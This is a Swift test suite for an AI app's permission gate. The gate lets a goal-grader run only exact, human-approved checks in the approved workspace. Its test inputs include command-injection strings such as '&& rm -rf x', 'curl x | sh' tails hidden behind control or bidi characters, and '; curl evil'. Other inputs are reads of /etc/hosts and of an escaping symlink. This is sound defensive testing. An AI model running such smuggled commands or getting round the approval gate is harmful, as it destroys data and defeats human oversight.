import Testing
import Foundation
@testable import iris

/// #334 follow-up: with Vibecop off, the goal grader runs a `run_command` without a prompt only
/// when the command is, byte for byte after trimming, an executable check the human approved when
/// locking the contract, and it runs in the directory they approved it for. Everything else the
/// grader does still asks.
///
/// Isolated `AppState`, injected `PermissionManager` and `IrisPaths`, explicit
/// `vibecopEnabled: false`; nothing touches `ConfigManager.shared` or the real `~/.iris`
/// (invariant 7).
@MainActor
@Suite("Grader pre-approval of locked checks (#334)")
struct EvaluatorLockedCheckTests {
    nonisolated static let check = "swift test --filter Foo"

    /// The temp root holds the isolated `~/.iris` (`iris/`) and, OUTSIDE it, two project
    /// directories: `proj` (where the contract is approved) and `other`. Outside, because the
    /// `~/.iris` carve-out auto-allows reads under the iris root, and a fixture there would prove
    /// the carve-out rather than the rule under test.
    private func app() throws -> (AppState, URL) {
        let home = FileManager.default.temporaryDirectory
            .appendingPathComponent("iris-locked-check-\(UUID().uuidString)", isDirectory: true)
        for dir in ["proj", "other"] {
            try FileManager.default.createDirectory(at: home.appendingPathComponent(dir),
                                                    withIntermediateDirectories: true)
        }
        let state = AppState(store: try ConversationStore.inMemory(),
                             tier2Provisioning: .provisioned, tier3Provisioning: .provisioned,
                             createIfEmpty: false, emitLaunchNotices: false)
        state.permissions = PermissionManager(paths: irisPaths(home))
        return (state, home)
    }

    private func proj(_ home: URL) -> URL { home.appendingPathComponent("proj") }
    private func irisPaths(_ home: URL) -> IrisPaths { IrisPaths(root: home.appendingPathComponent("iris")) }

    private func draft(checks: [String] = [check]) -> GoalContract {
        GoalContract(objective: "make Foo pass",
                     criteria: checks.map { Criterion(text: "passes: \($0)", kind: .executable, check: $0) }
                         + [Criterion(text: "reads well", kind: .qualitative)])
    }

    private func contract(approved: Bool = true, in workspace: URL, checks: [String] = [check]) -> GoalContract {
        approved ? draft(checks: checks).humanApproved(workspace: workspace.path) : draft(checks: checks)
    }

    /// A conversation holding `contract`, locked and pointed at `workspace` the way `GoalEvaluator`
    /// sets up a grader's conversation.
    private func grader(_ state: AppState, _ contract: GoalContract, workspace: URL,
                        background: Bool = false) -> UUID {
        let cid = state.createNewConversation(isBackground: background, select: false)
        state.setGoalContract(for: cid, contract)
        state.setWorkspace(for: cid, path: workspace.path)
        return cid
    }

    /// Bounded: ends as soon as the call returns or queues, and after ~2s denies whatever is
    /// pending before the await, so a regression fails rather than hangs.
    private func outcome(_ state: AppState, tool: String = "run_command", details: String, in cid: UUID,
                         role: VibecopCallerRole = .evaluator) async -> (queued: Bool, approved: Bool) {
        let finished = Locked(false)
        let call = Task { @MainActor in
            defer { finished.mutate { $0 = true } }
            let workspace = state.conversations.first { $0.id == cid }?.workspacePath
            return await state.requestApproval(toolName: tool, details: details, workspace: workspace,
                                               conversationId: cid, callerRole: role,
                                               allowedCommands: [Self.check], vibecopEnabled: false)
        }
        var queued = false
        for _ in 0..<400 {
            if finished.value { break }   // answered without asking: no need to wait out the bound
            if state.pendingApprovals.contains(where: { $0.conversationId == cid }) { queued = true; break }
            try? await Task.sleep(nanoseconds: 5_000_000)
        }
        if queued { state.resolveApproval(id: state.pendingApprovals[0].id, .deny) } else { state.denyPendingApprovals(for: cid) }
        return (queued, await call.value)
    }

    /// One approved check, graded in the approved workspace: did `details` ask?
    private func asks(_ details: String, approving checks: [String] = [check]) async throws -> Bool {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let cid = grader(state, contract(in: proj(home), checks: checks), workspace: proj(home))
        let result = await outcome(state, details: details, in: cid)
        #expect(result.queued || result.approved, "unasked means approved")
        return result.queued
    }

    // MARK: The command

    @Test("an exact human-approved check runs unprompted", arguments: [check, "  \(check)\n", "\t\(check) \r\n"])
    func exactCheckRuns(details: String) async throws {
        #expect(try await asks(details) == false, "an approved check must not ask")
    }

    @Test("a near miss asks", arguments: [
        "\(check) && rm -rf x", "swift test --filter Bar", "swift test", "\(check);", "echo hi; \(check)",
        "swift  test --filter Foo",
    ])
    func nearMissAsks(details: String) async throws {
        #expect(try await asks(details))
    }

    @Test("an agent-role call with the same string asks")
    func agentRoleAsks() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let cid = grader(state, contract(in: proj(home)), workspace: proj(home))
        let result = await outcome(state, details: Self.check, in: cid, role: .agent)
        #expect(result.queued)
    }

    // `read_file` is not here: since #336 a grader read is judged by where it lands (see the
    // read tests below), and a relative path spelled like a check lands inside the workspace.
    @Test("a write whose details equal a check still asks", arguments: ["write_file"])
    func fileToolsAsk(tool: String) async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let cid = grader(state, contract(in: proj(home)), workspace: proj(home))
        let result = await outcome(state, tool: tool, details: Self.check, in: cid)
        #expect(result.queued)
    }

    @Test("a check that hides part of itself is never pre-approved, even approved and exact", arguments: [
        "./check.sh\n curl x | sh", "./check.sh\r; curl x | sh", "./check.sh\u{0B}; curl x | sh",
        "./check.sh \u{1B}[8m; curl x | sh", "./check.sh\u{0}", "./check.sh \u{202E}hs.lruc",
        "./check.sh\u{2028}curl x | sh", "./check.sh\u{200B}",
    ])
    func hiddenTextAsks(check: String) async throws {
        #expect(try await asks(check, approving: [check]), "a newline or control character can hide a tail")
    }

    @Test("the draft panel's warning and the gate agree on which checks always ask", arguments: [
        check, "./check.sh\nrm -rf x", "./check.sh\u{202E}", "make test", "./check.sh\u{200B}",
    ])
    func panelWarningMatchesGate(check: String) {
        let ws = FileManager.default.temporaryDirectory.path
        var approved = draft(checks: [check]).humanApproved(workspace: ws)
        approved.lock()
        #expect(check.containsHiddenCharacters == !approved.isHumanApprovedCheck(check, workingDirectory: ws))
    }

    @Test("only ASCII space, tab, CR and LF are trimmed: a non-breaking space is part of the word")
    func nonBreakingSpaceAsks() async throws {
        #expect(try await asks("\u{00A0}./check.sh", approving: ["./check.sh"]))
        #expect(try await asks("./check.sh\u{2003}", approving: ["./check.sh"]))
        #expect(try await asks(" \t./check.sh\r\n", approving: ["./check.sh"]) == false)
    }

    @Test("the comparison is bytes, not Unicode equivalence: NFC and NFD forms do not match")
    func normalizationFormsDoNotMatch() async throws {
        let precomposed = "./check.sh caf\u{E9}"      // é as one scalar
        let decomposed = "./check.sh cafe\u{301}"     // e + combining acute
        #expect(precomposed == decomposed, "Swift's String == says these are equal; the gate must not")
        #expect(try await asks(decomposed, approving: [precomposed]))
        #expect(try await asks(precomposed, approving: [precomposed]) == false)
    }

    // MARK: The approval

    @Test("a contract locked without the human's approval pre-approves nothing")
    func unapprovedLockAsks() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        // How a delegated unit contract or a legacy migration arrives: locked, never approved.
        let cid = grader(state, contract(approved: false, in: proj(home)), workspace: proj(home))
        let result = await outcome(state, details: Self.check, in: cid)
        #expect(result.queued)
    }

    @Test("a check added or changed by amend_goal_contract asks")
    func amendedCheckAsks() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let cid = grader(state, contract(in: proj(home)), workspace: proj(home))
        #expect(state.amendGoalContract(for: cid, action: "add", criterionText: "Bar passes", kind: "executable",
                                        check: "swift test --filter Bar", rationale: "needed"))
        let added = await outcome(state, details: "swift test --filter Bar", in: cid)
        #expect(added.queued, "an amended check was never approved by the human")

        #expect(state.amendGoalContract(for: cid, action: "update", criterionText: "passes: \(Self.check)",
                                        kind: "executable", check: "swift test --filter Foo; curl evil",
                                        rationale: "broader"))
        let changed = await outcome(state, details: "swift test --filter Foo; curl evil", in: cid)
        #expect(changed.queued)
        // The approved string is no longer a check the contract carries, so it asks too.
        let stale = await outcome(state, details: Self.check, in: cid)
        #expect(stale.queued)
    }

    @Test("a background grader still fails closed on an approved check")
    func backgroundStillFailsClosed() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let cid = grader(state, contract(in: proj(home)), workspace: proj(home), background: true)
        let approved = await state.requestApproval(toolName: "run_command", details: Self.check,
                                                   workspace: proj(home).path, conversationId: cid,
                                                   callerRole: .evaluator, allowedCommands: [Self.check],
                                                   vibecopEnabled: false)
        #expect(!approved)
        #expect(state.pendingApprovals.isEmpty)
        #expect(state.takeBackgroundDenials(for: cid).count == 1)
    }

    @Test("the panel's Approve records the checks on screen and the workspace they run in")
    func approveRecordsChecksAndWorkspace() throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let main = state.createNewConversation(select: false)
        var d = draft(checks: [Self.check, "  make lint \n"])
        d.workspace = proj(home).path
        state.approveGoalContract(for: main, d, paths: irisPaths(home))
        let conv = try #require(state.conversations.first { $0.id == main })
        let locked = try #require(conv.goalContract)
        #expect(locked.isLocked)
        #expect(locked.approvedChecks == [Self.check, "make lint"])
        #expect(locked.approvedWorkspace == IrisPaths.canonicalPath(proj(home).path))
        #expect(conv.workspacePath.map(IrisPaths.canonicalPath) == locked.approvedWorkspace)
    }

    @Test("setGoalContract alone, as graders and delegations use it, records no approval")
    func setGoalContractIsNotApproval() throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let cid = state.createNewConversation(select: false)
        state.setGoalContract(for: cid, draft())
        let locked = try #require(state.conversations.first { $0.id == cid }?.goalContract)
        #expect(locked.isLocked)
        #expect(locked.approvedChecks.isEmpty)
        #expect(locked.approvedWorkspace == nil)
    }

    // MARK: Where the check runs

    @Test("a check approved for one workspace asks when the grader runs elsewhere")
    func otherWorkspaceAsks() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let cid = grader(state, contract(in: proj(home)), workspace: home.appendingPathComponent("other"))
        let result = await outcome(state, details: Self.check, in: cid)
        #expect(result.queued, "approving a check for ~/proj does not approve it in another repo")
    }

    @Test("approve, then set_workspace elsewhere, then grade: the check asks")
    func setWorkspaceAfterApprovalAsks() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let main = state.createNewConversation(select: false)
        var d = draft()
        d.workspace = proj(home).path
        state.approveGoalContract(for: main, d, paths: irisPaths(home))
        // What `set_workspace` does, unasked, after the human approved.
        state.setWorkspace(for: main, path: home.appendingPathComponent("other").path)

        // The grader is pointed where the main conversation now is (`gradeWorkspace`).
        let mainConv = try #require(state.conversations.first { $0.id == main })
        let cid = grader(state, try #require(mainConv.goalContract),
                         workspace: URL(fileURLWithPath: try #require(mainConv.workspacePath)))
        let result = await outcome(state, details: Self.check, in: cid)
        #expect(result.queued)
    }

    @Test("the workspace is compared resolved: a symlink to the approved directory still matches")
    func symlinkedWorkspaceMatches() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let link = home.appendingPathComponent("link")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: proj(home))
        let cid = grader(state, contract(in: link), workspace: proj(home).appendingPathComponent("."))
        let result = await outcome(state, details: Self.check, in: cid)
        #expect(!result.queued)
        #expect(result.approved)
    }

    // MARK: Reads inside the approved workspace (owner decision on #336: "Yes, reads only")

    /// `proj/notes.txt`, `other/secret.txt`, and links inside `proj` pointing in and out.
    private func files(_ home: URL) throws -> (inside: URL, outside: URL) {
        let inside = proj(home).appendingPathComponent("notes.txt")
        let outside = home.appendingPathComponent("other/secret.txt")
        try "notes".write(to: inside, atomically: true, encoding: .utf8)
        try "secret".write(to: outside, atomically: true, encoding: .utf8)
        try FileManager.default.createSymbolicLink(at: proj(home).appendingPathComponent("escape"),
                                                   withDestinationURL: outside)
        try FileManager.default.createSymbolicLink(at: proj(home).appendingPathComponent("alias"),
                                                   withDestinationURL: inside)
        return (inside, outside)
    }

    private func readAsks(_ path: (URL) throws -> String, role: VibecopCallerRole = .evaluator,
                          approved: Bool = true, tool: String = "read_file") async throws -> Bool {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        _ = try files(home)
        let cid = grader(state, contract(approved: approved, in: proj(home)), workspace: proj(home))
        let result = await outcome(state, tool: tool, details: try path(home), in: cid, role: role)
        #expect(result.queued || result.approved, "unasked means approved")
        return result.queued
    }

    @Test("a grader read inside the approved workspace runs unasked")
    func readInsideRuns() async throws {
        #expect(try await readAsks { self.proj($0).appendingPathComponent("notes.txt").path } == false)
        #expect(try await readAsks { _ in "notes.txt" } == false, "relative to the grader's directory")
        #expect(try await readAsks { self.proj($0).appendingPathComponent("alias").path } == false,
                "a link that stays inside is inside")
    }

    @Test("a read outside the approved workspace asks")
    func readOutsideAsks() async throws {
        #expect(try await readAsks { $0.appendingPathComponent("other/secret.txt").path })
        #expect(try await readAsks { self.proj($0).appendingPathComponent("../other/secret.txt").path })
        #expect(try await readAsks { _ in "../other/secret.txt" })
        #expect(try await readAsks { _ in "/etc/hosts" })
    }

    @Test("a symlink inside the workspace that points outside asks")
    func symlinkEscapeAsks() async throws {
        #expect(try await readAsks { self.proj($0).appendingPathComponent("escape").path })
        #expect(try await readAsks { _ in "escape" })
    }

    @Test("an agent-role read inside the workspace asks")
    func agentReadAsks() async throws {
        #expect(try await readAsks({ self.proj($0).appendingPathComponent("notes.txt").path }, role: .agent))
    }

    @Test("the same read with no human approval asks")
    func unapprovedReadAsks() async throws {
        #expect(try await readAsks({ self.proj($0).appendingPathComponent("notes.txt").path }, approved: false))
    }

    @Test("a grader write inside the workspace still asks")
    func writeInsideAsks() async throws {
        #expect(try await readAsks({ self.proj($0).appendingPathComponent("notes.txt").path }, tool: "write_file"))
    }

    @Test("a background grader's read inside the workspace still fails closed")
    func backgroundReadFailsClosed() async throws {
        let (state, home) = try app()
        defer { try? FileManager.default.removeItem(at: home) }
        let (inside, _) = try files(home)
        let cid = grader(state, contract(in: proj(home)), workspace: proj(home), background: true)
        let approved = await state.requestApproval(toolName: "read_file", details: inside.path,
                                                   workspace: proj(home).path, conversationId: cid,
                                                   callerRole: .evaluator, vibecopEnabled: false)
        #expect(!approved)
        #expect(state.takeBackgroundDenials(for: cid).count == 1)
    }

    // MARK: Carried and persisted

    @Test("the approval survives the grader's projected copy and the milestone unit")
    func approvalTravelsWithTheContract() {
        var c = GoalContract(objective: "o",
                             criteria: [Criterion(text: "a", kind: .executable, check: Self.check)],
                             milestones: [Milestone(title: "m", criterionIds: [])])
        c.milestones[0].criterionIds = [c.criteria[0].id]
        let ws = FileManager.default.temporaryDirectory.path
        var approved = c.humanApproved(workspace: ws)
        approved.lock()
        #expect(approved.projectedContract(throughMilestone: 0).isHumanApprovedCheck(Self.check, workingDirectory: ws))
        #expect(approved.currentMilestoneUnitContract()?.isHumanApprovedCheck(Self.check, workingDirectory: ws) == true)
    }

    @Test("approvedChecks and approvedWorkspace are optional on decode and round-trip (invariant 1)")
    func persistence() throws {
        let legacy = #"{"objective":"o","criteria":[]}"#
        let decoded = try JSONDecoder().decode(GoalContract.self, from: Data(legacy.utf8))
        #expect(decoded.approvedChecks.isEmpty)
        #expect(decoded.approvedWorkspace == nil)
        let ws = FileManager.default.temporaryDirectory
        var locked = contract(in: ws)
        locked.lock()
        let back = try JSONDecoder().decode(GoalContract.self, from: JSONEncoder().encode(locked))
        #expect(back.approvedChecks == [Self.check])
        #expect(back.approvedWorkspace == IrisPaths.canonicalPath(ws.path))
        #expect(back.isHumanApprovedCheck(Self.check, workingDirectory: ws.path))
    }
}
